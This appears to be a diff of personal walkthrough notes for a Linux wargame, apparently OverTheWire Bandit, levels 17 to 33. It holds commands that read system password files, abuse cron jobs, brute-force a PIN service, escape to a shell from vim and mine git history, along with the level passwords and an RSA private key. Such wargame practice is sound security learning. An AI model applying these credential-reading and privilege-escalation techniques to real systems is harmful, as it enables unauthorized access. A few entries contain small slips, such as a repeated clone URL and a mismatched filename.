@@ -150,3 +150,249 @@ YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
 dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
 vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
 -----END RSA PRIVATE KEY-----
+
+#Level 17 -> Level 18
+diff passwords.old passwords.new
+kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
+
+#Level 18 -> Level19
+cd $(mktemp -d)
+scp bandit18@localhost:~/readme .
+IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
+
+#Level 19 -> Level 20
+./bandit20-do cat /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+#Level 20 -> Level 21
+screen -S nc
+echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -l -p 31321
+./suconnect 31321
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+screen -r nc
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+#Level 21 -> Level 22
+cat cronjob_bandit22
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+cat /usr/bin/cronjob_bandit22.sh
+
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+#Level 22 -> Level 23
+cat /etc/cron.d/cronjob_bandit23
+
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+cat /usr/bin/cronjob_bandit23.sh
+
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+run bandit22-23.sh
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+
+#Level 23 -> Level 24
+cat /etc/cron.d/cronjob_bandit24
+
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+
+cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+cd $(mktemp -d)
+
+nano payload.sh
+#!/bin/bash
+myname=$(whoami)
+cat /etc/bandit_pass/$myname > /tmp/tmp.35m07RM4Tb/bandit24_pass
+
+chmod 777 payload.sh
+chmod 777 /tmp/tmp.35m07RM4Tb/
+touch bandit24_pass
+chmod 777 bandit24_pass
+cp payload.sh /var/spool/bandit24/payload.sh
+cat bandit24_pass 
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+#Level 24 -> Level 25
+echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ xxxx | nc localhost 30002
+
+cd $(mktemp -d)
+#!/bin/bash
+password24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+for i in {0000..9999}
+  do
+    echo $password24 $i >> test.txt
+done
+
+cat test.txt | nc localhost 30002
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+
+#Level 25 -> Level 26
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
+/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
+xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
+1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
+3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
+qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
+il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
+e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
+Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
+zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
+c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
+wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
+tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
+2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
+i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
+6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
+pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
+JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
+JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
+1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
+ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
+euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
+/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+
+need to resize window
+v
+:e /etc/bandit_pass/bandit26
+
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+#Level 26 -> Level 27
+need to resize window
+v
+:set shell=/bin/sh
+:!command
+:! ./bandit27-do cat /etc/bandit_pass/bandit27
+
+3ba3118a22e93127a4ed485be72ef5ea
+
+#Level 27 -> Level 28
+cd $(mktemp -d)
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+cat README
+The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
+
+#Level 28 -> Level 29
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+cat README
+The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
+cat README.md
+
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: xxxxxxxxxx
+
+git log
+git diff c086d11a00c0648d095d04c089786efef5e01264
+diff --git a/README.md b/README.md
+index 3f7cee8..5c6457b 100644
+--- a/README.md
++++ b/README.md
+@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
+ ## credentials
+ 
+ - username: bandit29
+-- password: bbc96594b4e001778eee9975372716b2
++- password: xxxxxxxxxx
+
+
+#Level 29 -> Level 30
+git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+cat README.md
+
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: <no passwords in production!>
+
+git checkout origin/dev
+cat README.md
+
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: 5b90576bedb2cc04c86a9e924ce42faf
+
+
+#Level 30 -> Level 31
+git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
+git show --name-only secret
+47e603bb428404d265f59c42920d81e5
+
+#Level 31 -> Level 32
+git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
+echo May I come in? > ket.txt
+git add key.txt -f
+git commit
+git push
+
+remote: ### Attempting to validate files... ####
+remote: 
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote: 
+remote: Well done! Here is the password for the next level:
+remote: 56a9bf19c63d650ce78e6ec0354ee45e
+remote: 
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote: 
+
+
+#Level 32 -> Level 33
+$0
+cat /etc/bandit_pass/bandit33 
+c9c3199ddf4121b10cf581a98d51caee
+
+
+#Level 33 -> Level 34
